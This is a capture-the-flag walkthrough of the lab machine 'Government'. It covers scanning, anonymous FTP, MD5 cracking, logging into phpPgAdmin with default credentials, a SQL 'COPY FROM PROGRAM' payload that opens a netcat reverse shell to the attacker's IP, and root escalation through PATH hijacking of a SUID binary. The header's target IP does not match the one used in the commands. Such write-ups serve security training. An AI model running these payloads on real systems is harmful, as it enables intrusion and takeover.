**Remote Target IP: `10.0.0.24`**  
**Difficulty: `Medium`**

## **1. Enumeration**

    root@kali ~/D/M/Government# nmap -sS -p- -T4 10.0.0.14

    PORT      STATE SERVICE
    21/tcp    open  ftp
    22/tcp    open  ssh
    80/tcp    open  http
    111/tcp   open  rpcbind
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    2049/tcp  open  nfs
    35815/tcp open  unknown
    41677/tcp open  unknown
    44895/tcp open  unknown
    52735/tcp open  unknown

We have a couple of ports, but the only intresting ones are FTP on 21, SSH on 22 and HTTP on 80.

    root@kali ~/D/M/Government# nmap -sS -p21,22,80 -A -T4 10.0.0.14

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
    | drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
    |_drwxr-xr-x    2 0        0            4096 Nov 14  2021 news
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.0.0.27
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 0b:95:9a:37:ae:d8:b0:c0:23:78:eb:04:c2:9b:6c:41 (RSA)
    |   256 d4:a1:3b:a7:cc:e2:ea:ee:2e:6b:91:36:f9:be:da:6f (ECDSA)
    |_  256 22:9f:42:60:3d:56:20:15:3a:ff:7c:19:0d:20:ca:7a (ED25519)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    | http-robots.txt: 2 disallowed entries 
    |_/login.php /admin
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache/2.4.25 (Debian)

We can see from the scan the anonymous login is enabled on the FTP service.

### ***- FTP***

    root@kali ~/D/M/Government# ftp 10.0.0.14
    Connected to 10.0.0.14.
    Name (10.0.0.14:root): anonymous
    Password: 
    230 Login successful.

    ftp> ls
    drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
    drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
    drwxr-xr-x    2 0        0            4096 Nov 14  2021 news

After downloading the directories to our local machine we read their content.

    root@kali ~/D/M/G/directries_from_FTP# ls -lR

    ./files:
    total 12
    -rw-r--r-- 1 root root 179 Aug 31  2021 encrypt.txt
    -rw-r--r-- 1 root root 217 Aug 31  2021 old.txt
    -rw-r--r-- 1 root root 158 Aug 31  2021 remove.txt

    ./government:
    total 8
    -rw-r--r-- 1 root root 298 Aug 31  2021 gov.txt
    -rw-r--r-- 1 root root 287 Aug 31  2021 security.txt

    ./news:
    total 8
    -rw-r--r-- 1 root root 488 Nov 14  2021 note.txt
    -rw-r--r-- 1 root root 756 Aug 31  2021 today.txt

Let's read the files on the **`files`** directory.

    root@kali ~/D/M/G/d/files# cat encrypt.txt
    //Attention: 

    -- Password are encrypted in MD5 -- 

    Change the encryption with (Blowfish or Tryple DES)

    //After this operation , delete this file.


    - Government Policy & Rules
>
    root@kali ~/D/M/G/d/files# cat old.txt 
    //Old password removed - 

    7c8e2414a014851ef13527070ce37ede

    b20a6dc6c921e4d2fb49bda509b77c46

    36c0ae2711103178a07506f0f6f18c66

    480a808105b6fff3f0a57a4a4e74cb7d

    //Please remove this file

    -Government Policy & Rules
>
    root@kali ~/D/M/G/d/files# cat remove.txt 
    //Remove this old employee from database

    #emma 
    #christian
    #luds
    #malic
    #susan

    //After removing this user - Remove this file


    - Governament Policy & Rules

We can use the [**`john`**][1] command or [**`CrackStation`**][2] to crack the md5 hashed passwords.

    Encrypted                          Cracked

    7c8e2414a014851ef13527070ce37ede - emma213

    b20a6dc6c921e4d2fb49bda509b77c46 - emerald

    36c0ae2711103178a07506f0f6f18c66 - cocacola2

    480a808105b6fff3f0a57a4a4e74cb7d - hello999

Now that we have passwords and usernames let's try to find a possible login.

###  **- HTTP**

    root@kali ~/D/M/Government# gobuster dir -u http://10.0.0.14/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,html

    /index.html           (Status: 200) [Size: 43]
    /blog                 (Status: 301) [Size: 305] [--> http://10.0.0.14/blog/]
    /robots.txt           (Status: 200) [Size: 52]                              
    /phppgadmin           (Status: 301) [Size: 311] [--> http://10.0.0.14/phppgadmin/]

Let's go to **`http://10.0.0.14/phppgadmin`**.

![image](https://user-images.githubusercontent.com/76552238/177597216-62ef7e50-917f-4256-a6f5-5077a164bdb9.png)

Clicking in the top right on **PostGreSQL** we are redirected to **`http://10.0.0.14/phppgadmin/redirect.php`**

![image](https://user-images.githubusercontent.com/76552238/177597409-5fe9300c-8b54-4d2a-8c70-09e5b4b52702.png)

We now have a login form. I tried logging in with the credentials we found on the FTP server but it didn't work. I searched for [**phpPgAdmin default login**][3] and found that the default username is **`postgres`** and the password is what the creator of the server entered. Turns out the password was **`admin`**. 

![image](https://user-images.githubusercontent.com/76552238/177598239-42a92199-abaa-44de-b869-cf16f2729d41.png)

![image](https://user-images.githubusercontent.com/76552238/177598281-5000b35c-0ca3-4a44-a158-a8d7d97e83b4.png)

Now that we are logged in, let's find a way to exploit the service. I found an [exploit][4] that allows us to run arbitrary commands on the remote server using the PhpPgAdmin service.

    # Exploit Title: phpPgAdmin 7.13.0 - COPY FROM PROGRAM Command Execution (Authenticated)
    # Date: 29/03/2021
    # Exploit Author: Valerio Severini
    # Vendor Homepage: Software Link: https://github.com/phppgadmin/phppgadmin/releases/tag/REL_7-13-0
    # Version: 7.13.0 or lower
    # Tested on: Debian 10 and Ubuntu

    Description: phpPgAdmin through 7.13.0 allows remote authenticated users to execute arbitrary code. An attacker can create a table named cmd_exec with one column, add type=text and cmd_out, and try to execute the query via a SQL tab. It will fail because of restrictions on statements. However, the attacker can bypass this step by uploading a .txt file (containing a SQL statement such as "COPY cmd_exec FROM PROGRAM" followed by OS commands) in the Browse bar. This achieves remote command execution via a "SELECT * FROM cmd_exec" statement.

    Attack Vectors (PoC):
    1) you have to create a table manually and call it "cmd_exec" with 1 column
    2) add cmd_output and type = text
    3) try to execute the query via SQL tabs , but it should fail because of restriction of Statement.
    4) A malicious Attacker could bypass this step uploading a .txt file in "Browse" bar, with a SQL malicious query inside, for example: " COPY cmd_exec FROM PROGRAM 'id; cd /root; ls'; "
    5) The attacker could execute Remote command execution and obtain full access control executing in SQL query: " SELECT * FROM cmd_exec; "

Executing the following commands in the SQL tab will grant us access to the remote machine.

    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec(cmd_output text);
    COPY cmd_exec FROM PROGRAM 'nc -e /bin/bash 10.0.0.27 4444';
    SELECT * FROM cmd_exec;

![image](https://user-images.githubusercontent.com/76552238/177761406-531ef443-5454-4dc0-9c24-efbc1658d151.png)

## 2. **Privilege Escalation**

We are logged in as the user **`postgres`**. 

    postgres@government:/$ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    _apt:x:104:65534::/nonexistent:/bin/false
    Debian-exim:x:105:109::/var/spool/exim4:/bin/false
    avahi-autoipd:x:106:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
    messagebus:x:107:111::/var/run/dbus:/bin/false
    sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
    erik:x:1000:1000:erik,,,:/home/erik:/bin/bash
    postgres:x:109:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    ftp:x:110:117:ftp daemon,,,:/srv/ftp:/bin/false
    statd:x:111:65534::/var/lib/nfs:/bin/false

There is another user **`erik`** on the remote machine. Let's upload and [**`linPeas`**][5] to try to find hidden information.

    ╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
    -rw-r--r-- 1 root root 432 Sep  1  2021 /var/log/.creds.log 
>
    postgres@government:/$ cat /var/log/.creds.log
    ##WARNING##

    //This file contain sensitive informations!!


    /////////////////////////////////////////////////////////////
    244fff13bf3c5f471e0e6bf7900945936cf1354dfea15130
    ////////////////////////////////////////////////////////////
    key: Tr770f1NdMy1mP0sSibl3P4sSw0rD,7iK3Th4t!
    ////////////////////////////////////////////////////////////
    IV: 5721370743022037
    ////////////////////////////////////////////////////////////


    #WARNING#

The encryption of this password is unknown, so let's go back to the files we found on the FTP server and see if they have any information on this password.

**/files/encrypt.txt:**

    //Attention: 

    -- Password are encrypted in MD5 -- 

    Change the encryption with (Blowfish or Tryple DES)

    //After this operation , delete this file.


    - Government Policy & Rules

The password is hashed with **[Blowfish][6]** or **[Tryple DES][7]** encrypting algorithms. Let's go to **[CyberChef][8]** and find out.

![image](https://user-images.githubusercontent.com/76552238/177799157-292d88b0-ce9c-4267-aa54-16c2ae720af0.png)

Triple DES is not it because the key size is not valid.

![image](https://user-images.githubusercontent.com/76552238/177799617-e3e42edd-07e0-4250-90fe-32ad1480aba0.png)
<!--h4cK1sMyf4v0ri73G4m3-->

Let's see if this is the password for the user **`erik`** on the remote machine

![image](https://user-images.githubusercontent.com/76552238/177800013-28d556a8-1a93-4143-b53d-8fade7018b88.png)

And we're in.  
Let's read the first flag.

    erik@government:~$ cat user.txt
    349efd4b1ccbeb4d3ca0108fa5cc5802

    erik@government:~$ ls -l
    total 8
    drwxr-xr-x 6 erik erik 4096 Aug 31  2021 backups
    -rw-r--r-- 1 erik erik   33 Aug 31  2021 user.txt 
    erik@government:~$ ls -l backups/
    total 16
    drwxr-xr-x 2 root root 4096 Sep  1  2021 company
    drwxr-xr-x 2 root root 4096 Aug 31  2021 iron
    drwxr-xr-x 2 erik erik 4096 Jul  7 16:48 nuclear
    drwxr-xr-x 2 root root 4096 Aug 31  2021 nylon

    erik@government:~/backups$ ls -lAR
    .:
    total 16
    drwxr-xr-x 2 root root 4096 Sep  1  2021 company
    drwxr-xr-x 2 root root 4096 Aug 31  2021 iron
    drwxr-xr-x 2 erik erik 4096 Jul  7 16:48 nuclear
    drwxr-xr-x 2 root root 4096 Aug 31  2021 nylon

    ./company:
    total 12
    -rw-r--r-- 1 root root 137 Aug 31  2021 htb.txt
    -rw-r--r-- 1 root root 214 Aug 31  2021 manager.txt
    -rw-r--r-- 1 root root 208 Aug 31  2021 our.txt

    ./iron:
    total 12
    -rw-r--r-- 1 root root 221 Aug 31  2021 effect.txt
    -rw-r--r-- 1 root root 111 Aug 31  2021 ir.txt
    -rw-r--r-- 1 root root 254 Aug 31  2021 wht.txt

    ./nuclear:
    total 28
    -rw-r--r-- 1 root root   75 Aug 31  2021 file.txt
    -rw-r--r-- 1 root root   82 Aug 31  2021 git.txt
    -rw-r--r-- 1 root root   73 Aug 31  2021 nuc.txt
    -rwsr-sr-x 1 root root 8800 Aug 31  2021 remove

    ./nylon:
    total 20
    -rw-r--r-- 1 root root 267 Aug 31  2021 fabric.txt
    -rw-r--r-- 1 root root 308 Aug 31  2021 harmful.txt
    -rw-r--r-- 1 root root 314 Aug 31  2021 nl.txt
    -rw-r--r-- 1 root root 333 Aug 31  2021 non-toxic.txt
    -rw-r--r-- 1 root root 218 Aug 31  2021 usage.txt

Like the FTP server we have many text files with no real help, BUT on the nuclear directory we have a binary with SUID permissions.

    erik@government:~/backups/nuclear$ ./remove
    Error: Please enter a program to time!

The binary might use the time command, but I'm not sure, let's try to get more information by using the strings **`command`**.

    erik@government:~/backups/nuclear$ strings remove

![image](https://user-images.githubusercontent.com/76552238/177804855-eab2c881-ab97-46fc-ad48-d0150fbd34d1.png)

The binary indeed is using the time command. We can now change the PATH environment variable and our own command named time and exploit the binary.

    erik@government:~/backups/nuclear$ touch time
    erik@government:~/backups/nuclear$ echo '/bin/sh' > time
    erik@government:~/backups/nuclear$ chmod +x time
    erik@government:~/backups/nuclear$ export PATH=/home/erik/backups/nuclear:$PATH

Running the **remove** binary should get us a shell as the root user.

![image](https://user-images.githubusercontent.com/76552238/177805587-76f2d338-4839-4d77-8f3f-d6a92cf77d0e.png)

    # cat root.txt
    df2f7ef853a5b36c51509a6f6ae2e7b1


[1]: "https://linuxcommandlibrary.com/man/john"
[2]: "https://crackstation.net/"
[3]: "https://community.bitnami.com/t/default-username-for-postgresql/40330"
[4]: "https://packetstormsecurity.com/files/162051/phpPgAdmin-7.13.0-Command-Execution.html"
[5]: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
[6]: "https://en.wikipedia.org/wiki/Blowfish_(cipher)"
[7]: "https://en.wikipedia.org/wiki/Triple_DES"
[8]: "https://gchq.github.io/CyberChef/"